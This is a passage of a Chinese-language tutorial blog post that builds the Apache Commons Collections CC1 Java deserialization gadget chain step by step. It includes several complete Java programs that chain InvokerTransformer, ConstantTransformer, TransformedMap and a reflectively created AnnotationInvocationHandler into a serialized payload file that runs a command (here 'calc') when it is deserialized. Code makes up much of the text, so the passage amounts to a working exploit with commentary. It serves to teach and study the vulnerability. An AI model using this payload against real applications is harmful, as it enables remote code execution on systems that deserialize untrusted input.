class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">oos</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;payload.ser&quot;</span>));</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//反序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title function_\">unserialize</span><span class=\"params\">(String Filename)</span> <span class=\"keyword\">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">ois</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(Filename));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> ois.readObject();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753129-20.png\" alt=\"img\"></p>\n<p>成功弹窗，不过可惜的是，在反序列化之后，还是要执行一次 transform 函数，所以我们还是要按照前面的思路，寻找能够在反序列化时自动触发 transform 函数的操作。</p>\n<h3 id=\"4-1-2-TransformedMap-类\"><a href=\"#4-1-2-TransformedMap-类\" class=\"headerlink\" title=\"4.1.2 TransformedMap 类\"></a>4.1.2 TransformedMap 类</h3><p>我们在查找 transform 方法的用例时发现了 TransformedMap 类中有好几个方法的返回结果中都调用了 transform 方法，我们重点关注一下。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753129-21.png\" alt=\"img\"></p>\n<p>跟进 TransformedMap 类，我们就不逐个分析了，直接定位到关键的 checkSetValue 方法。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753129-22.png\" alt=\"img\"></p>\n<p>接收一个对象并且传入 valueTransformer 常量的 transform 方法，跟进 valueTransformer 常量。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-23.png\" alt=\"img\"></p>\n<p>可以看到，该常量在类的构造方法中被赋值，而该类是用 protected 修饰的，只能内部调用，所以我们找一下该类中有哪些调用了此构造方法的地方，然后找到了 decorate 方法，它返回一个TransformedMap 类的实例化，从而调用构造方法。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-24.png\" alt=\"img\"></p>\n<p>解决了这个问题，接下来就是要找到能够调用 checkSetValue 方法的地方。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-25.png\" alt=\"img\"></p>\n<p>只有 AbstractInputCheckedMapDecorator 类调用了，而 TransformedMap 类继承了该类，所以我们不需要实例化它。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-26.png\" alt=\"img\"></p>\n<p>接着来看 AbstractInputCheckedMapDecorator 类中调用了 checkSetValue 方法的 setValue 方法。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-27.png\" alt=\"img\"></p>\n<p>结合该方法的所在的 MapEntry 类分析，该方法是被重写过的，用于设置键值对中的值，而调用 checkSetValue 方法的 parent 常量在 MapEntry 类的构造函数中被赋值，所以我们继续之前的思路，找到其他能调用 setValue 的类。</p>\n<h3 id=\"4-1-3-AnnotationInvocationHandler-类\"><a href=\"#4-1-3-AnnotationInvocationHandler-类\" class=\"headerlink\" title=\"4.1.3 AnnotationInvocationHandler 类\"></a>4.1.3 AnnotationInvocationHandler 类</h3><p>而在寻找的过程我们发现了 AnnotationInvocationHandler 类的 readObject 方法里竟然调用了这个方法。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-28.png\" alt=\"img\"></p>\n<p>这不就是我们构造利用链的最终目的吗，赶紧跟进看一下。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-29.png\" alt=\"img\"></p>\n<p>该readObject方法在执行反序列化操作之后，遍历了一个键值对集合 memberValues，其中键表示注解成员变量的名称，值表示注解成员变量的值。同时，使用 memberTypes 集合查找名称为 name 的成员变量对应的类型。如果该成员变量存在，那么获取它的值，并检查值是否属于该成员变量的类型或者是否是 ExceptionProxy 类型的实例。如果都不是，那么将该值转换为 AnnotationTypeMismatchExceptionProxy 类型，并设置该类型的 member 属性为该注解类型对应的成员变量中名称为 name 的成员变量，在最后调用 memberValue.setValue() 方法来设置该注解成员变量的值。</p>\n<p>而键值对集合 memberValues 则是 Map.Entry 对象，在 MapEntry 类中的 setValue() 方法实际上是调用了被包装的原始 Map.Entry 对象的 setValue() 方法，以实现对键值对中值的修改操作。所以我们可以利用 TransformedMap 类的 decorate 方法修饰一个 put 了键值的 hashMap 对象，然后将修饰过的 Map 对象进行遍历，就能调用 setValue 方法，而且前面提到 decorate 方法接收的第三个参数正是最终会调用 transform 方法的 valueTransformer 常量，所以我们需要在该位置传入我们的 ChainedTransformer 对象，然后 setValue 传入 Runtime.class 就能达到 chainedtransformer.transform(Runtime.class); 的效果，我们不妨先来试一下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CC1TransformedMap</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class, Class[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;),</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedtransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">HashedMap</span> <span class=\"variable\">hashedMap</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashedMap</span>();</span><br><span class=\"line\">        hashedMap.put(<span class=\"string\">&quot;a&quot;</span>,<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(hashedMap,<span class=\"literal\">null</span>,chainedtransformer);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(Map.Entry entry:decorate.entrySet())&#123;</span><br><span class=\"line\">            entry.setValue(Runtime.class);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(decorate);</span><br><span class=\"line\">        System.out.println(unserialize(<span class=\"string\">&quot;payload.ser&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">oos</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;payload.ser&quot;</span>));</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//反序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title function_\">unserialize</span><span class=\"params\">(String Filename)</span> <span class=\"keyword\">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">ois</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(Filename));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> ois.readObject();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-30.png\" alt=\"img\"></p>\n<p>不过这里的 Map 遍历操作是我们自己加的，我们需要找到能够实现这个操作的地方，而前面说到的 AnnotationInvocationHandler 类的 readObject 方法里正好就有这么一个操作，我们回看 AnnotationInvocationHandler 类，发现其并非是 public 类，需要通过反射调用。除此之外，在 readObject 方法里遍历操作中我们还需要绕过两个 if 语句才能成功执行 setValue 方法。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-31.png\" alt=\"img\"></p>\n<p>经过前面的分析我们知道</p>\n<p>String name &#x3D; memberValue.getKey();</p>\n<p>Class&lt;?&gt; memberType &#x3D; memberTypes.get(name);</p>\n<p>的作用是获取键值对的键名然后获取注解中成员变量并且检查键值对中键名是否有对应的名称，并且注解可以通过 AnnotationInvocationHandler 的实例化对象传入，所以我们找到了 Target 注解里面有一个名为 value 的成员变量。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-32.png\" alt=\"img\"></p>\n<p>所以我们可以传入这个注解，且让我们的键值对的键名为 value 就可以了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Target;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CC1TransformedMap</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class, Class[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;),</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedtransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">HashedMap</span> <span class=\"variable\">hashedMap</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashedMap</span>();</span><br><span class=\"line\">        hashedMap.put(<span class=\"string\">&quot;value&quot;</span>,<span class=\"string\">&quot;1&quot;</span>);    <span class=\"comment\">//绕过if</span></span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(hashedMap,<span class=\"literal\">null</span>,chainedtransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//反射调用</span></span><br><span class=\"line\">        Class&lt;?&gt; Clazz = Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">        Constructor&lt;?&gt; declaredConstructor = Clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class=\"line\">        declaredConstructor.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">o</span> <span class=\"operator\">=</span> declaredConstructor.newInstance(Target.class,decorate);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(o);</span><br><span class=\"line\">        System.out.println(unserialize(<span class=\"string\">&quot;payload.ser&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">oos</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;payload.ser&quot;</span>));</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//反序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title function_\">unserialize</span><span class=\"params\">(String Filename)</span> <span class=\"keyword\">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">ois</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(Filename));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> ois.readObject();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>调试发现，readObject 方法可以正常调用了，两个 if 也都可以通过了。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-33.png\" alt=\"img\"></p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-34.png\" alt=\"img\"></p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-35.png\" alt=\"img\"></p>\n<p>然而，弹窗失败，我们再次断点调试，这才发现 setValue 已经不是我们想要传入的 Runtime.class 了。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-36.png\" alt=\"img\"></p>\n<p>那我们该如何传入 Runtime.class 呢？</p>\n<h3 id=\"4-1-4-ConstantTransformer-类\"><a href=\"#4-1-4-ConstantTransformer-类\" class=\"headerlink\" title=\"4.1.4 ConstantTransformer 类\"></a>4.1.4 ConstantTransformer 类</h3><p>这时就不得不提起另一个继承了 Transformer 接口的 ConstantTransformer 类了，我们重点关注它的构造方法和重写的 transform 方法。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-37.png\" alt=\"img\"></p>\n<p>可以看到，该构造函数接收一个对象，并且把它赋值给 iConstant 常量。而 transform 函数则比较有意思，接收一个对象，但是返回值却是 iConstant 常量，所以这时我们就可以将它加入到 Transformer 数组中并且传入 Runtime.class。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-38.png\" alt=\"img\"></p>\n<p>这样一来，不管传入setValue的对象是什么，带入 ChainedTransformer 实例的执行完第一个 transform 循环后返回给第二个循环的永远都是我们设置的 Runtime.class，最终完成链条的完美闭环。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Target;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CC1TransformedMap</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class, Class[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;),</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedtransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">HashedMap</span> <span class=\"variable\">hashedMap</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashedMap</span>();</span><br><span class=\"line\">        hashedMap.put(<span class=\"string\">&quot;value&quot;</span>,<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(hashedMap,<span class=\"literal\">null</span>,chainedtransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        Class&lt;?&gt; Clazz = Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">        Constructor&lt;?&gt; declaredConstructor = Clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class=\"line\">        declaredConstructor.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">o</span> <span class=\"operator\">=</span> declaredConstructor.newInstance(Target.class,decorate);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(o);</span><br><span class=\"line\">        System.out.println(unserialize(<span class=\"string\">&quot;payload.ser&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">oos</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;payload.ser&quot;</span>));</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//反序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title function_\">unserialize</span><span class=\"params\">(String Filename)</span> <span class=\"keyword\">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">ois</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(Filename));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> ois.readObject();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753130-39.png\" 